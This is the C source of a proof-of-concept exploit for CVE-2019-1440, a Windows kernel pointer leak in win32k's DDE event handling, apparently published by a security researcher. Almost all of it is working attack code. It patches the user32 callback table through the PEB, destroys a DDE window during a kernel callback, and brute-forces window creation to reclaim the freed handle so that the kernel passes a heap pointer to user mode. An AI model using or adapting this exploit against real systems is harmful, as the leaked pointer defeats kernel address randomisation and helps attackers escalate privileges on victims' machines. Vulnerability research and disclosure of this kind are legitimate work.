// Gil Dabah August 2019
// CVE-2019-1440
// All Windows versions affected.
// This POC is for Windows 10 x64.
// 
// DDE EVENT_PACKET kernel heap pointer leak.
// The bug is inside xxxCsEvent, where it's possible to replace a DDE HWND to anything else
// and receiving a PEP kernel pointer to usermode.
//
// It occurs because first loop collects all DDE HWNDs.
// And then second loop just goes over them and calls SendMessage upon each.
// In between, it's possible to destroy the first window, which is going to be called soon, and then leaking the pointer.

// Side note -
// Due to xxxChangeMonitorFlags's algorithm, it's necessary to play with flag and flag2 values below so control flow will reach to xxxCsEvent.
// Alternatively, using a VM, it's easier just to restart it and run this POc again.

#include <stdio.h>
#include <windows.h>

#define DDE_UNINT_PROCNO 0x2f
#define ClientDdeEvent 0x41

typedef NTSTATUS(WINAPI *NtCallbackReturnPtr)(PVOID, ULONG, NTSTATUS);
NtCallbackReturnPtr NtCallbackReturnFunc = NULL;

typedef LRESULT(CALLBACK *de_proc)(PVOID, PVOID);
de_proc g_orig_de = NULL;

typedef ULONG_PTR(WINAPI *NtUserCallOneParamPtr)(ULONG_PTR param, DWORD procNumber);
NtUserCallOneParamPtr NtUserCallOneParam = NULL;

HANDLE ddeHandle1 = NULL, ddeHandle2 = NULL;
HWND h1 = NULL, h2 = NULL;

int g_ok = 0;

ULONG_PTR GetPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* GetUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)GetPEB() + 0x58);
}

LRESULT CALLBACK wndproc(HWND h, UINT m, WPARAM w, LPARAM l)
{
	printf("Kernel pointer: %I64x\n", (ULONG_PTR)l);
	return DefWindowProc(h, m, w, l);
}

LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		if (h1 != (HWND)wParam)
		{
			// Fail window creation ASAP for performance boost
			return 1;
		}
	}
	return 0;
}

LRESULT CALLBACK clientddeevent(PVOID a, PVOID b)
{
	if (!g_ok) NtCallbackReturnFunc(NULL, 0, 0);

	printf("DDE Event callback: %p %p\n", a, b);

	// Now we're destroying the first DDE instance we created.
	NtUserCallOneParam((ULONG_PTR)ddeHandle1, DDE_UNINT_PROCNO);
	printf("Window is destroyed: %d\n", IsWindow(h1) == 0);

	// Its window is destroy too, but in the kernel it's still going to be used as HWND.
	// If we manage to get that same window handle, with our own window and window-proc,
	// then the function xxxCsEvent will SendMessage with a PEP kernel pointer.

	if (IsWindow(h1) == FALSE)
	{
		printf("Brute forcing window handle\n");
		HWND h = NULL;

		SetWindowsHookEx(WH_CBT, hookProc, NULL, GetCurrentThreadId());

		for (unsigned int i = 0; i < 0x10000; i++)
		{
			if (i % 1000 == 0) printf("*");
			h = CreateWindow("button", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
			if (h == h1)
			{
				break;
			}
			DestroyWindow(h);
		}

		if (h == h1)
		{
			// Change wndproc to our own func, so we can get the pointer on next call.
			SetWindowLongPtr(h, GWLP_WNDPROC, (LONG_PTR)wndproc);
			printf("Success!\n");
		}
		else
		{
			printf("Oiii\n");
		}
	}

	return NtCallbackReturnFunc(NULL, 0, 0);
}

int main()
{
	CreateMenu(); // Dummy API for linking win32u.

	HMODULE hWin32u = GetModuleHandle("win32u");
	typedef DWORD(WINAPI *DdeInitPtr)(PHANDLE outHandle, HWND *outWnd, LPDWORD flags, DWORD cmds, PVOID cookie);
	DdeInitPtr DdeInit = (DdeInitPtr)GetProcAddress(hWin32u, "NtUserDdeInitialize");
	NtUserCallOneParam = (NtUserCallOneParamPtr)GetProcAddress(hWin32u, "NtUserCallOneParam");
	NtCallbackReturnFunc = (NtCallbackReturnPtr)GetProcAddress(GetModuleHandle("ntdll"), "NtCallbackReturn");

	ULONG_PTR* ptrAddr = &GetUser32Callbacks()[ClientDdeEvent];
	g_orig_de = *(de_proc*)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)clientddeevent;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);

	DWORD flag = 0xf0000000;
	DWORD flag2 = 0xfff00000;

	DWORD ddeFlags = 0;
	if (DdeInit(&ddeHandle1, &h1, &ddeFlags, flag, NULL))
	{
		printf("Can't init dde\n");
		return 1;
	}
	if (NULL == h1)
	{
		printf("Failed creating h1\n");
		return 2;
	}
	printf("Created dde h1:%p\n", h1);

	// Now it's okay to handle the hook.
	g_ok = 1;

	ddeFlags = 0;
	if (DdeInit(&ddeHandle2, &h2, &ddeFlags, flag2, NULL))
	{
		printf("Can't init dde2\n");
		return 3;
	}
	if (NULL == h2)
	{
		printf("Failed creating h2\n");
		return 4;
	}
	printf("Created dde h2:%p\n", h2);

	return 0;
}
